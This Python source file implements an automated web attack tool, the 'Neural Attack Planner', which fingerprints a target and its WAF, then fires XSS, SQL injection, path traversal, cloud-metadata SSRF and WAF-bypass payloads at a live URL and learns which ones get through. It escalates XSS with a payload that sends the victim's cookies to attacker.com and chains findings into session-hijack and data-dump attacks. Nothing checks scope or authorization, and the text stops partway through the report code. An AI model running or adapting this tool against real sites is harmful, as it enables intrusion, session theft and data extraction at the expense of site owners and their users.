"""
Neural Attack Planner
======================

An advanced AI system that thinks like an elite pentester by:

1. MULTI-SITUATIONAL ANALYSIS
   - Analyzes multiple attack vectors simultaneously
   - Finds correlations between different observations
   - Identifies compound vulnerabilities

2. PATTERN RECOGNITION
   - Recognizes attack patterns from responses
   - Detects WAF/filter behavior patterns
   - Identifies technology fingerprints

3. DECISION MATRIX
   - Weighs multiple factors for each decision
   - Considers risk vs. reward
   - Prioritizes based on success probability

4. ADAPTIVE LEARNING
   - Learns from each request/response
   - Adapts payloads in real-time
   - Remembers what works across sessions

5. COMPOUND ATTACKS
   - Chains multiple vulnerabilities
   - Combines low-severity into high-severity
   - Creates novel attack paths

Author: canigetrichpls
"""

import asyncio
import json
import re
import hashlib
from dataclasses import dataclass, field
from enum import Enum, auto
from typing import Any, Dict, List, Optional, Set, Tuple, Callable
from datetime import datetime
from urllib.parse import urlparse, urljoin, parse_qs, urlencode, quote
import structlog

logger = structlog.get_logger(__name__)


# =============================================================================
# NEURAL MODELS
# =============================================================================

class SignalType(Enum):
    """Types of signals the neural planner can detect."""
    # Response signals
    REFLECTION = auto()           # Input reflected in output
    ERROR_DISCLOSURE = auto()     # Error message leaked info
    TIMING_ANOMALY = auto()       # Response time unusual
    SIZE_ANOMALY = auto()         # Response size unusual
    STATUS_CHANGE = auto()        # HTTP status changed
    REDIRECT = auto()             # Redirect occurred
    
    # Security signals
    WAF_BLOCK = auto()            # WAF blocked request
    RATE_LIMIT = auto()           # Rate limiting hit
    FILTER_DETECTED = auto()      # Input filtering detected
    SANITIZATION = auto()         # Input sanitization detected
    
    # Vulnerability signals
    XSS_POSSIBLE = auto()         # XSS might work
    SQLI_POSSIBLE = auto()        # SQLi might work
    IDOR_POSSIBLE = auto()        # IDOR might work
    SSRF_POSSIBLE = auto()        # SSRF might work
    LFI_POSSIBLE = auto()         # LFI might work
    AUTH_WEAK = auto()            # Auth seems weak
    
    # Technology signals
    TECH_PHP = auto()
    TECH_JAVA = auto()
    TECH_DOTNET = auto()
    TECH_NODEJS = auto()
    TECH_PYTHON = auto()
    TECH_RUBY = auto()


class AttackPhase(Enum):
    """Current phase of the attack."""
    RECONNAISSANCE = auto()
    ENUMERATION = auto()
    VULNERABILITY_ANALYSIS = auto()
    EXPLOITATION = auto()
    POST_EXPLOITATION = auto()


@dataclass
class Signal:
    """A signal detected during analysis."""
    type: SignalType
    strength: float  # 0.0 to 1.0
    source: str      # What triggered this signal
    evidence: Dict[str, Any] = field(default_factory=dict)
    timestamp: datetime = field(default_factory=datetime.now)


@dataclass
class AttackVector:
    """A potential attack vector with probability scoring."""
    name: str
    type: str
    target: str
    payload: str
    
    # Scoring
    success_probability: float = 0.0  # 0.0 to 1.0
    impact_score: float = 0.0         # 0.0 to 1.0
    risk_score: float = 0.0           # Risk of detection
    
    # Requirements
    prerequisites: List[str] = field(default_factory=list)
    signals_needed: List[SignalType] = field(default_factory=list)
    
    # State
    attempted: bool = False
    successful: bool = False
    result: Dict[str, Any] = field(default_factory=dict)


@dataclass
class NeuralState:
    """The neural planner's current state."""
    phase: AttackPhase = AttackPhase.RECONNAISSANCE
    signals: List[Signal] = field(default_factory=list)
    vectors: List[AttackVector] = field(default_factory=list)
    
    # Knowledge base
    target_tech: Set[str] = field(default_factory=set)
    blocked_patterns: Set[str] = field(default_factory=set)
    working_patterns: Set[str] = field(default_factory=set)
    
    # Metrics
    requests_made: int = 0
    successful_attacks: int = 0
    
    # Response baseline
    baseline_length: int = 0
    baseline_time: float = 0.0
    baseline_status: int = 200


@dataclass
class ExploitChain:
    """A chain of exploits that work together."""
    name: str
    steps: List[AttackVector]
    combined_probability: float
    combined_impact: float
    poc: str = ""
    evidence: Dict[str, Any] = field(default_factory=dict)


# =============================================================================
# SIGNAL DETECTION ENGINE
# =============================================================================

class SignalDetector:
    """Detects signals from HTTP responses."""
    
    # Patterns for technology detection
    TECH_PATTERNS = {
        SignalType.TECH_PHP: [
            r"\.php", r"PHPSESSID", r"X-Powered-By:\s*PHP",
            r"laravel", r"symfony", r"wordpress", r"drupal",
        ],
        SignalType.TECH_JAVA: [
            r"\.jsp", r"JSESSIONID", r"java\.", r"springframework",
            r"struts", r"tomcat", r"jboss",
        ],
        SignalType.TECH_DOTNET: [
            r"\.aspx?", r"ASP\.NET", r"__VIEWSTATE", r"__EVENTVALIDATION",
            r"X-AspNet-Version", r"X-Powered-By:\s*ASP\.NET",
        ],
        SignalType.TECH_NODEJS: [
            r"express", r"X-Powered-By:\s*Express", r"node\.js",
            r"npm", r"webpack", r"\.mjs",
        ],
        SignalType.TECH_PYTHON: [
            r"django", r"flask", r"gunicorn", r"uwsgi",
            r"\.py", r"python", r"jinja",
        ],
        SignalType.TECH_RUBY: [
            r"\.rb", r"ruby", r"rails", r"sinatra",
            r"X-Powered-By:\s*Phusion",
        ],
    }
    
    # Patterns for vulnerability detection
    VULN_PATTERNS = {
        SignalType.SQLI_POSSIBLE: [
            r"mysql", r"mariadb", r"postgres", r"sqlite", r"oracle",
            r"sql syntax", r"query failed", r"database error",
            r"ORA-\d+", r"PLS-\d+", r"SQL Server",
        ],
        SignalType.XSS_POSSIBLE: [
            # Canary reflected without encoding
        ],
        SignalType.LFI_POSSIBLE: [
            r"failed to open stream", r"no such file", r"include\(",
            r"require\(", r"file_get_contents",
        ],
        SignalType.SSRF_POSSIBLE: [
            r"connection refused", r"connection timed out", r"couldn't connect",
            r"getaddrinfo", r"name or service not known",
        ],
    }
    
    # WAF signatures
    WAF_SIGNATURES = {
        "cloudflare": [r"cf-ray", r"cloudflare", r"__cfduid"],
        "akamai": [r"akamai", r"ghost", r"ak_bmsc"],
        "aws_waf": [r"aws", r"x-amz", r"x-amzn-requestid"],
        "imperva": [r"imperva", r"incapsula", r"visid_incap"],
        "f5": [r"f5", r"big-ip", r"ts[a-z0-9]{6,}"],
        "modsecurity": [r"mod_security", r"modsec", r"NOYB"],
        "sucuri": [r"sucuri", r"x-sucuri"],
    }
    
    def detect_signals(
        self,
        response_text: str,
        response_headers: Dict[str, str],
        status_code: int,
        elapsed_time: float,
        canary: str = None,
        baseline: NeuralState = None,
    ) -> List[Signal]:
        """Detect all signals from a response."""
        signals = []
        
        combined = f"{response_text} {json.dumps(response_headers)}".lower()
        
        # Technology detection
        for signal_type, patterns in self.TECH_PATTERNS.items():
            for pattern in patterns:
                if re.search(pattern, combined, re.I):
                    signals.append(Signal(
                        type=signal_type,
                        strength=0.8,
                        source=f"Pattern: {pattern}",
                        evidence={"matched": pattern},
                    ))
                    break
        
        # Vulnerability patterns
        for signal_type, patterns in self.VULN_PATTERNS.items():
            for pattern in patterns:
                match = re.search(pattern, combined, re.I)
                if match:
                    signals.append(Signal(
                        type=signal_type,
                        strength=0.7,
                        source=f"Error pattern: {pattern}",
                        evidence={"matched": match.group()},
                    ))
                    break
        
        # Canary reflection (XSS potential)
        if canary and canary in response_text:
            # Check if it's HTML encoded or not
            encoded_canary = canary.replace("<", "&lt;").replace(">", "&gt;")
            if canary in response_text and encoded_canary not in response_text:
                signals.append(Signal(
                    type=SignalType.XSS_POSSIBLE,
                    strength=0.9,
                    source="Unencoded reflection",
                    evidence={"canary": canary, "context": self._get_context(response_text, canary)},
                ))
            else:
                signals.append(Signal(
                    type=SignalType.REFLECTION,
                    strength=0.6,
                    source="Canary reflected (may be encoded)",
                    evidence={"canary": canary},
                ))
        
        # WAF detection
        for waf_name, patterns in self.WAF_SIGNATURES.items():
            for pattern in patterns:
                if re.search(pattern, combined, re.I):
                    signals.append(Signal(
                        type=SignalType.WAF_BLOCK if status_code in [403, 406] else SignalType.FILTER_DETECTED,
                        strength=0.9,
                        source=f"WAF: {waf_name}",
                        evidence={"waf": waf_name, "pattern": pattern},
                    ))
                    break
        
        # Status code analysis
        if status_code in [403, 406, 429]:
            signals.append(Signal(
                type=SignalType.WAF_BLOCK if status_code != 429 else SignalType.RATE_LIMIT,
                strength=0.9,
                source=f"Status code: {status_code}",
            ))
        
        # Timing analysis
        if baseline and elapsed_time > baseline.baseline_time + 3:
            signals.append(Signal(
                type=SignalType.TIMING_ANOMALY,
                strength=min((elapsed_time - baseline.baseline_time) / 10, 1.0),
                source=f"Delayed response: {elapsed_time:.2f}s vs baseline {baseline.baseline_time:.2f}s",
                evidence={"elapsed": elapsed_time, "baseline": baseline.baseline_time},
            ))
        
        # Size analysis
        if baseline and abs(len(response_text) - baseline.baseline_length) > 500:
            signals.append(Signal(
                type=SignalType.SIZE_ANOMALY,
                strength=0.6,
                source=f"Size change: {len(response_text)} vs baseline {baseline.baseline_length}",
                evidence={"size": len(response_text), "baseline": baseline.baseline_length},
            ))
        
        return signals
    
    def _get_context(self, html: str, canary: str, context_size: int = 100) -> str:
        """Get context around canary in HTML."""
        pos = html.find(canary)
        if pos == -1:
            return ""
        start = max(0, pos - context_size)
        end = min(len(html), pos + len(canary) + context_size)
        return html[start:end]


# =============================================================================
# NEURAL DECISION ENGINE
# =============================================================================

class NeuralDecisionEngine:
    """Makes intelligent attack decisions based on signals."""
    
    # Decision matrix: signal combinations -> attack strategies
    DECISION_MATRIX = {
        # Single signal decisions
        (SignalType.XSS_POSSIBLE,): {
            "strategy": "xss_exploitation",
            "priority": 10,
            "payloads": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"],
        },
        (SignalType.SQLI_POSSIBLE,): {
            "strategy": "sqli_exploitation",
            "priority": 10,
            "payloads": ["' OR '1'='1", "1' AND '1'='1", "' UNION SELECT NULL--"],
        },
        (SignalType.REFLECTION,): {
            "strategy": "xss_probing",
            "priority": 8,
            "payloads": ["<test>", "\"onclick=\"", "'onmouseover='"],
        },
        
        # Multi-signal decisions (more sophisticated)
        (SignalType.REFLECTION, SignalType.TECH_PHP): {
            "strategy": "php_xss",
            "priority": 9,
            "payloads": ["<?=alert(1)?>", "<script>alert(1)</script>", "{{constructor}}"],
        },
        (SignalType.REFLECTION, SignalType.TECH_NODEJS): {
            "strategy": "node_xss",
            "priority": 9,
            "payloads": ["{{constructor.constructor('return this')()}}", "${7*7}"],
        },
        (SignalType.TIMING_ANOMALY, SignalType.SQLI_POSSIBLE): {
            "strategy": "blind_sqli",
            "priority": 10,
            "payloads": ["'; WAITFOR DELAY '0:0:5'--", "' AND SLEEP(5)--"],
        },
        (SignalType.WAF_BLOCK,): {
            "strategy": "waf_bypass",
            "priority": 7,
            "payloads": [],  # Will be generated dynamically
        },
        (SignalType.SIZE_ANOMALY, SignalType.IDOR_POSSIBLE): {
            "strategy": "idor_exploitation",
            "priority": 9,
            "payloads": ["1", "2", "0", "-1", "admin"],
        },
    }
    
    # WAF bypass techniques by WAF type
    WAF_BYPASS = {
        "cloudflare": [
            "<svg onload=alert`1`>",
            "<img src=x onerror=alert&#40;1&#41;>",
            "<script>alert(String.fromCharCode(49))</script>",
        ],
        "akamai": [
            "<ScRiPt>alert(1)</ScRiPt>",
            "<img/src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>",
        ],
        "aws_waf": [
            "<%00script>alert(1)</script>",
            "<script>al\\u0065rt(1)</script>",
        ],
        "generic": [
            "<svg onload=alert(1)>",
            "<img src=x onerror=alert`1`>",
            "<body onload=alert(1)>",
            "<input onfocus=alert(1) autofocus>",
            "<marquee onstart=alert(1)>",
            "<video><source onerror=alert(1)>",
        ],
    }
    
    def __init__(self):
        self.decisions_made: List[Dict] = []
    
    def analyze_signals(
        self,
        signals: List[Signal],
        state: NeuralState,
    ) -> List[AttackVector]:
        """Analyze signals and generate attack vectors."""
        vectors = []
        
        # Get signal types present
        signal_types = set(s.type for s in signals)
        
        # Check decision matrix for matching patterns
        for pattern, decision in self.DECISION_MATRIX.items():
            if all(st in signal_types for st in pattern):
                # Generate vectors based on decision
                vectors.extend(self._generate_vectors(decision, signals, state))
        
        # If WAF detected, add bypass vectors
        waf_signals = [s for s in signals if s.type == SignalType.WAF_BLOCK]
        if waf_signals:
            vectors.extend(self._generate_waf_bypass_vectors(waf_signals, state))
        
        # Score and sort vectors
        vectors = self._score_vectors(vectors, signals, state)
        vectors.sort(key=lambda v: v.success_probability * v.impact_score, reverse=True)
        
        return vectors
    
    def _generate_vectors(
        self,
        decision: Dict,
        signals: List[Signal],
        state: NeuralState,
    ) -> List[AttackVector]:
        """Generate attack vectors from a decision."""
        vectors = []
        strategy = decision["strategy"]
        priority = decision["priority"]
        
        for payload in decision.get("payloads", []):
            # Skip blocked patterns
            if payload in state.blocked_patterns:
                continue
            
            vector = AttackVector(
                name=f"{strategy}_{hashlib.md5(payload.encode()).hexdigest()[:6]}",
                type=strategy,
                target="",  # Will be filled later
                payload=payload,
                success_probability=priority / 10,
                impact_score=self._get_impact_score(strategy),
            )
            vectors.append(vector)
        
        return vectors
    
    def _generate_waf_bypass_vectors(
        self,
        waf_signals: List[Signal],
        state: NeuralState,
    ) -> List[AttackVector]:
        """Generate WAF bypass vectors."""
        vectors = []
        
        # Identify WAF type
        waf_type = "generic"
        for signal in waf_signals:
            if "waf" in signal.evidence:
                waf_type = signal.evidence["waf"]
                break
        
        # Get appropriate bypass payloads
        payloads = self.WAF_BYPASS.get(waf_type, self.WAF_BYPASS["generic"])
        
        for payload in payloads:
            if payload not in state.blocked_patterns:
                vector = AttackVector(
                    name=f"waf_bypass_{waf_type}",
                    type="waf_bypass",
                    target="",
                    payload=payload,
                    success_probability=0.4,  # Lower prob for bypass attempts
                    impact_score=0.8,
                )
                vectors.append(vector)
        
        return vectors
    
    def _score_vectors(
        self,
        vectors: List[AttackVector],
        signals: List[Signal],
        state: NeuralState,
    ) -> List[AttackVector]:
        """Score vectors based on available signals and state."""
        for vector in vectors:
            # Boost probability if relevant signals are strong
            relevant_signals = [s for s in signals if self._signal_supports_vector(s, vector)]
            if relevant_signals:
                avg_strength = sum(s.strength for s in relevant_signals) / len(relevant_signals)
                vector.success_probability *= (1 + avg_strength)
            
            # Reduce if similar patterns were blocked
            for blocked in state.blocked_patterns:
                if self._similar_pattern(blocked, vector.payload):
                    vector.success_probability *= 0.5
            
            # Boost if similar patterns worked
            for working in state.working_patterns:
                if self._similar_pattern(working, vector.payload):
                    vector.success_probability *= 1.5
            
            # Cap at 1.0
            vector.success_probability = min(vector.success_probability, 1.0)
        
        return vectors
    
    def _signal_supports_vector(self, signal: Signal, vector: AttackVector) -> bool:
        """Check if a signal supports an attack vector."""
        mappings = {
            SignalType.XSS_POSSIBLE: ["xss", "reflection"],
            SignalType.SQLI_POSSIBLE: ["sqli", "injection"],
            SignalType.REFLECTION: ["xss", "reflection"],
            SignalType.TIMING_ANOMALY: ["blind", "sqli"],
        }
        
        for signal_type, keywords in mappings.items():
            if signal.type == signal_type:
                return any(kw in vector.type.lower() for kw in keywords)
        
        return False
    
    def _similar_pattern(self, pattern1: str, pattern2: str) -> bool:
        """Check if two patterns are similar."""
        # Simple similarity check
        p1 = set(pattern1.lower().split())
        p2 = set(pattern2.lower().split())
        
        if not p1 or not p2:
            return False
        
        overlap = len(p1 & p2) / max(len(p1), len(p2))
        return overlap > 0.5
    
    def _get_impact_score(self, strategy: str) -> float:
        """Get impact score for a strategy."""
        impact_map = {
            "sqli_exploitation": 1.0,
            "blind_sqli": 1.0,
            "xss_exploitation": 0.8,
            "xss_probing": 0.6,
            "idor_exploitation": 0.9,
            "ssrf_exploitation": 1.0,
            "waf_bypass": 0.7,
        }
        return impact_map.get(strategy, 0.5)


# =============================================================================
# COMPOUND ATTACK SYNTHESIZER
# =============================================================================

class CompoundAttackSynthesizer:
    """Synthesizes compound attacks from multiple vectors."""
    
    # Compound attack templates
    COMPOUND_TEMPLATES = {
        "xss_to_session_hijack": {
            "name": "XSS to Session Hijacking",
            "steps": ["reflection_test", "xss_injection", "cookie_theft"],
            "required_signals": [SignalType.XSS_POSSIBLE],
            "impact": 1.0,
        },
        "sqli_to_data_dump": {
            "name": "SQLi to Data Extraction",
            "steps": ["error_detection", "sqli_injection", "union_extraction"],
            "required_signals": [SignalType.SQLI_POSSIBLE],
            "impact": 1.0,
        },
        "idor_to_account_takeover": {
            "name": "IDOR to Account Takeover",
            "steps": ["id_enumeration", "idor_access", "profile_modification"],
            "required_signals": [SignalType.IDOR_POSSIBLE],
            "impact": 1.0,
        },
        "info_disclosure_to_exploitation": {
            "name": "Info Disclosure Chain",
            "steps": ["error_harvest", "endpoint_discovery", "targeted_attack"],
            "required_signals": [SignalType.ERROR_DISCLOSURE],
            "impact": 0.9,
        },
        "waf_bypass_to_xss": {
            "name": "WAF Bypass to XSS",
            "steps": ["waf_fingerprint", "bypass_technique", "xss_injection"],
            "required_signals": [SignalType.WAF_BLOCK, SignalType.REFLECTION],
            "impact": 0.9,
        },
        "blind_sqli_extraction": {
            "name": "Blind SQLi Data Extraction",
            "steps": ["timing_detection", "boolean_injection", "bit_extraction"],
            "required_signals": [SignalType.TIMING_ANOMALY],
            "impact": 1.0,
        },
    }
    
    def synthesize_chains(
        self,
        vectors: List[AttackVector],
        signals: List[Signal],
        state: NeuralState,
    ) -> List[ExploitChain]:
        """Synthesize compound attack chains."""
        chains = []
        signal_types = set(s.type for s in signals)
        
        for template_id, template in self.COMPOUND_TEMPLATES.items():
            # Check if required signals are present
            if all(sig in signal_types for sig in template["required_signals"]):
                # Find matching vectors for each step
                chain_vectors = self._find_chain_vectors(template, vectors)
                
                if chain_vectors:
                    chain = ExploitChain(
                        name=template["name"],
                        steps=chain_vectors,
                        combined_probability=self._calculate_chain_prob(chain_vectors),
                        combined_impact=template["impact"],
                    )
                    chains.append(chain)
        
        return chains
    
    def _find_chain_vectors(
        self,
        template: Dict,
        vectors: List[AttackVector],
    ) -> List[AttackVector]:
        """Find vectors matching chain steps."""
        matched = []
        
        for step in template["steps"]:
            for vector in vectors:
                if step in vector.type or step in vector.name:
                    matched.append(vector)
                    break
        
        return matched if len(matched) == len(template["steps"]) else matched
    
    def _calculate_chain_prob(self, vectors: List[AttackVector]) -> float:
        """Calculate combined probability for a chain."""
        if not vectors:
            return 0.0
        
        prob = 1.0
        for v in vectors:
            prob *= v.success_probability
        
        return prob


# =============================================================================
# NEURAL ATTACK PLANNER (MAIN CLASS)
# =============================================================================

class NeuralAttackPlanner:
    """
    The main neural attack planning system.
    
    Coordinates all components to make intelligent attack decisions.
    """
    
    def __init__(self, http_client=None, rate_limiter=None):
        self.http_client = http_client
        self.rate_limiter = rate_limiter
        
        # Components
        self.signal_detector = SignalDetector()
        self.decision_engine = NeuralDecisionEngine()
        self.synthesizer = CompoundAttackSynthesizer()
        
        # State
        self.state = NeuralState()
        self.exploits: List[Dict] = []
    
    async def plan_and_execute(
        self,
        target_url: str,
        initial_findings: List[dict] = None,
        max_iterations: int = 20,
    ) -> Tuple[List[Dict], List[ExploitChain], str]:
        """
        Main entry point for neural attack planning.
        
        Returns:
            Tuple of (exploits found, chains created, report)
        """
        initial_findings = initial_findings or []
        
        logger.info(f"[Neural] Starting neural attack planning: {target_url}")
        
        # =================================================================
        # PHASE 1: BASELINE & INITIAL SIGNALS
        # =================================================================
        
        await self._establish_baseline(target_url)
        
        # Process initial findings into signals
        initial_signals = self._findings_to_signals(initial_findings)
        self.state.signals.extend(initial_signals)
        
        logger.info(f"[Neural] Initial signals: {len(initial_signals)}")
        
        # =================================================================
        # PHASE 2: RECONNAISSANCE
        # =================================================================
        
        self.state.phase = AttackPhase.RECONNAISSANCE
        recon_signals = await self._reconnaissance(target_url)
        self.state.signals.extend(recon_signals)
        
        logger.info(f"[Neural] Recon signals: {len(recon_signals)}")
        
        # =================================================================
        # PHASE 3: NEURAL PLANNING
        # =================================================================
        
        self.state.phase = AttackPhase.VULNERABILITY_ANALYSIS
        
        # Get attack vectors from decision engine
        vectors = self.decision_engine.analyze_signals(
            self.state.signals,
            self.state,
        )
        self.state.vectors = vectors
        
        logger.info(f"[Neural] Attack vectors generated: {len(vectors)}")
        
        # Synthesize compound attacks
        chains = self.synthesizer.synthesize_chains(
            vectors,
            self.state.signals,
            self.state,
        )
        
        logger.info(f"[Neural] Compound chains: {len(chains)}")
        
        # =================================================================
        # PHASE 4: EXPLOITATION
        # =================================================================
        
        self.state.phase = AttackPhase.EXPLOITATION
        
        for iteration in range(max_iterations):
            # Get best vector
            best = self._get_best_vector()
            if not best:
                break
            
            logger.info(f"[Neural] Iteration {iteration + 1}: Trying {best.name} (prob: {best.success_probability:.2f})")
            
            # Execute vector
            result = await self._execute_vector(target_url, best)
            
            # Learn from result
            self._learn_from_result(best, result)
            
            # If successful, try to escalate
            if result.get("success"):
                escalation = await self._try_escalation(target_url, best)
                if escalation:
                    self.exploits.append(escalation)
        
        # =================================================================
        # PHASE 5: REPORT GENERATION
        # =================================================================
        
        report = self._generate_report(target_url, chains)
        
        return self.exploits, chains, report
    
    # =========================================================================
    # PHASE IMPLEMENTATIONS
    # =========================================================================
    
    async def _establish_baseline(self, url: str):
        """Establish baseline for the target."""
        if not self.http_client:
            return
        
        try:
            if self.rate_limiter:
                await self.rate_limiter.acquire()
            
            start = datetime.now()
            response = await self.http_client.get(url)
            elapsed = (datetime.now() - start).total_seconds()
            
            self.state.baseline_length = len(response.text)
            self.state.baseline_time = elapsed
            self.state.baseline_status = response.status_code
            
            # Detect initial signals from baseline
            signals = self.signal_detector.detect_signals(
                response.text,
                dict(response.headers),
                response.status_code,
                elapsed,
            )
            self.state.signals.extend(signals)
            
        except Exception as e:
            logger.error(f"[Neural] Baseline error: {e}")
    
    async def _reconnaissance(self, url: str) -> List[Signal]:
        """Perform reconnaissance to gather signals."""
        signals = []
        
        if not self.http_client:
            return signals
        
        # Test different probes
        probes = [
            # Reflection probe
            ("?test=NEURAL_PROBE_XSS", "NEURAL_PROBE_XSS"),
            # Error probe
            ("?id='", None),
            # Path probe
            ("/../../../../etc/passwd", None),
            # SSRF probe
            ("?url=http://169.254.169.254/", None),
        ]
        
        for probe, canary in probes:
            try:
                if self.rate_limiter:
                    await self.rate_limiter.acquire()
                
                test_url = urljoin(url, probe) if probe.startswith("/") else url + probe
                
                start = datetime.now()
                response = await self.http_client.get(test_url)
                elapsed = (datetime.now() - start).total_seconds()
                
                probe_signals = self.signal_detector.detect_signals(
                    response.text,
                    dict(response.headers),
                    response.status_code,
                    elapsed,
                    canary=canary,
                    baseline=self.state,
                )
                signals.extend(probe_signals)
                
            except Exception as e:
                logger.debug(f"[Neural] Probe error: {e}")
        
        return signals
    
    def _findings_to_signals(self, findings: List[dict]) -> List[Signal]:
        """Convert initial findings to signals."""
        signals = []
        
        for finding in findings:
            ftype = finding.get("type", "").lower()
            fname = finding.get("name", "").lower()
            
            # Map finding types to signal types
            if "xss" in ftype or "reflection" in ftype:
                signals.append(Signal(
                    type=SignalType.REFLECTION,
                    strength=0.7,
                    source=f"Finding: {fname}",
                    evidence=finding,
                ))
            
            if "sql" in ftype or "injection" in ftype:
                signals.append(Signal(
                    type=SignalType.SQLI_POSSIBLE,
                    strength=0.7,
                    source=f"Finding: {fname}",
                    evidence=finding,
                ))
            
            if "idor" in ftype or "insecure" in ftype:
                signals.append(Signal(
                    type=SignalType.IDOR_POSSIBLE,
                    strength=0.7,
                    source=f"Finding: {fname}",
                    evidence=finding,
                ))
            
            if "error" in ftype or "disclosure" in ftype:
                signals.append(Signal(
                    type=SignalType.ERROR_DISCLOSURE,
                    strength=0.6,
                    source=f"Finding: {fname}",
                    evidence=finding,
                ))
            
            # Technology detection from findings
            if any(t in fname for t in ["php", "laravel", "wordpress"]):
                signals.append(Signal(type=SignalType.TECH_PHP, strength=0.8, source=fname))
            elif any(t in fname for t in ["node", "express", "react"]):
                signals.append(Signal(type=SignalType.TECH_NODEJS, strength=0.8, source=fname))
            elif any(t in fname for t in ["asp", ".net", "iis"]):
                signals.append(Signal(type=SignalType.TECH_DOTNET, strength=0.8, source=fname))
            elif any(t in fname for t in ["django", "flask", "python"]):
                signals.append(Signal(type=SignalType.TECH_PYTHON, strength=0.8, source=fname))
        
        return signals
    
    def _get_best_vector(self) -> Optional[AttackVector]:
        """Get the best untried attack vector."""
        untried = [v for v in self.state.vectors if not v.attempted]
        
        if not untried:
            return None
        
        # Sort by expected value (prob * impact)
        untried.sort(
            key=lambda v: v.success_probability * v.impact_score,
            reverse=True,
        )
        
        return untried[0]
    
    async def _execute_vector(self, url: str, vector: AttackVector) -> Dict:
        """Execute an attack vector."""
        vector.attempted = True
        result = {"success": False, "evidence": {}}
        
        if not self.http_client:
            return result
        
        try:
            if self.rate_limiter:
                await self.rate_limiter.acquire()
            
            # Build test URL
            parsed = urlparse(url)
            if "?" in url:
                test_url = f"{url}&test={quote(vector.payload)}"
            else:
                test_url = f"{url}?test={quote(vector.payload)}"
            
            start = datetime.now()
            response = await self.http_client.get(test_url)
            elapsed = (datetime.now() - start).total_seconds()
            
            # Check for success indicators
            if vector.payload in response.text:
                result["success"] = True
                result["evidence"]["reflected"] = True
                result["evidence"]["context"] = self._get_context(response.text, vector.payload)
            
            # Detect new signals
            new_signals = self.signal_detector.detect_signals(
                response.text,
                dict(response.headers),
                response.status_code,
                elapsed,
                canary=vector.payload,
                baseline=self.state,
            )
            
            self.state.signals.extend(new_signals)
            result["signals"] = new_signals
            
            vector.result = result
            
        except Exception as e:
            result["error"] = str(e)
        
        return result
    
    def _learn_from_result(self, vector: AttackVector, result: Dict):
        """Learn from attack result."""
        self.state.requests_made += 1
        
        if result.get("success"):
            self.state.successful_attacks += 1
            self.state.working_patterns.add(vector.payload)
            vector.successful = True
            
            # Record exploit
            self.exploits.append({
                "type": vector.type,
                "payload": vector.payload,
                "evidence": result.get("evidence", {}),
            })
            
            logger.info(f"[Neural] SUCCESS: {vector.name}")
        
        else:
            # Check if blocked
            signals = result.get("signals", [])
            if any(s.type == SignalType.WAF_BLOCK for s in signals):
                self.state.blocked_patterns.add(vector.payload)
                logger.info(f"[Neural] Blocked: {vector.payload[:30]}...")
    
    async def _try_escalation(self, url: str, vector: AttackVector) -> Optional[Dict]:
        """Try to escalate a successful attack."""
        escalation = None
        
        # XSS escalation
        if "xss" in vector.type:
            escalation = await self._escalate_xss(url, vector)
        
        # SQLi escalation
        elif "sqli" in vector.type:
            escalation = await self._escalate_sqli(url, vector)
        
        return escalation
    
    async def _escalate_xss(self, url: str, vector: AttackVector) -> Optional[Dict]:
        """Escalate XSS to higher impact."""
        escalation_payloads = [
            "<script>alert(document.domain)</script>",
            "<script>alert(document.cookie)</script>",
            "<img src=x onerror=fetch('https://attacker.com/'+document.cookie)>",
        ]
        
        for payload in escalation_payloads:
            if payload in self.state.blocked_patterns:
                continue
            
            try:
                if self.rate_limiter:
                    await self.rate_limiter.acquire()
                
                test_url = f"{url}?test={quote(payload)}"
                response = await self.http_client.get(test_url)
                
                if payload in response.text:
                    return {
                        "type": "xss_escalated",
                        "original_payload": vector.payload,
                        "escalated_payload": payload,
                        "impact": "Session hijacking possible",
                        "poc": self._generate_xss_poc(url, payload),
                    }
            except Exception:
                pass
        
        return None
    
    async def _escalate_sqli(self, url: str, vector: AttackVector) -> Optional[Dict]:
        """Escalate SQLi to data extraction."""
        # Try UNION-based extraction
        union_payloads = [
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
        ]
        
        for payload in union_payloads:
            if payload in self.state.blocked_patterns:
                continue
            
            try:
                if self.rate_limiter:
                    await self.rate_limiter.acquire()
                
                test_url = f"{url}?test={quote(payload)}"
                response = await self.http_client.get(test_url)
                
                # Check for successful UNION
                if response.status_code == 200 and "NULL" in response.text:
                    return {
                        "type": "sqli_escalated",
                        "original_payload": vector.payload,
                        "escalated_payload": payload,
                        "impact": "Data extraction possible",
                        "poc": f"sqlmap -u '{url}?test=1' --dbs",
                    }
            except Exception:
                pass
        
        return None
    
    def _get_context(self, html: str, payload: str, size: int = 100) -> str:
        """Get context around payload in HTML."""
        pos = html.find(payload)
        if pos == -1:
            return ""
        start = max(0, pos - size)
        end = min(len(html), pos + len(payload) + size)
        return html[start:end]
    
    def _generate_xss_poc(self, url: str, payload: str) -> str:
        """Generate XSS PoC."""
        return f"""<!DOCTYPE html>
<html>
<head><title>XSS PoC</title></head>
<body>
<h1>XSS Vulnerability Proof of Concept</h1>
<p><strong>URL:</strong> {url}?test={quote(payload)}</p>
<p><strong>Payload:</strong> <code>{payload}</code></p>
<h2>Impact</h2>
<ul>
<li>Session hijacking via cookie theft</li>
<li>Keylogging user input</li>
<li>Phishing via content injection</li>
<li>CSRF via script execution</li>
</ul>
<a href="{url}?test={quote(payload)}" target="_blank">Test Link</a>
</body>
</html>"""
    
    # =========================================================================
    # REPORT GENERATION
    # =========================================================================
    
    def _generate_report(self, url: str, chains: List[ExploitChain]) -> str:
        """Generate comprehensive neural attack report."""
        # Count signals by type
        signal_counts = {}
        for signal in self.state.signals:
            stype = signal.type.name
            signal_counts[stype] = signal_counts.get(stype, 0) + 1
        
        report = f"""# 🧠 Neural Attack Planner Report

## Target Analysis

**URL:** {url}
**Baseline Response:** {self.state.baseline_length} bytes, {self.state.baseline_time:.2f}s
**Requests Made:** {self.state.requests_made}
**Successful Attacks:** {self.state.successful_attacks}

## Signal Detection

| Signal Type | Count |
|-------------|-------|
"""
        for stype, count in sorted(signal_counts.items(), key=lambda x: x[1], reverse=True):
            report += f"| {stype} | {count} |\n"
        
        report += f"""
## Technologies Detected

"""
        for tech in self.state.target_tech:
            report += f"- {tech}\n"
        
        if not self.state.target_tech:
            tech_signals = [s for s in self.state.signals if s.type.name.startswith("TECH_")]
            for s in tech_signals:
                report += f"- {s.type.name.replace('TECH_', '')} (confidence: {s.strength:.0%})\n"
        
        report += f"""
## Attack Vectors Generated

Total: {len(self.state.vectors)}

| Vector | Type | Probability | Impact |
|--------|------|-------------|--------|
"""
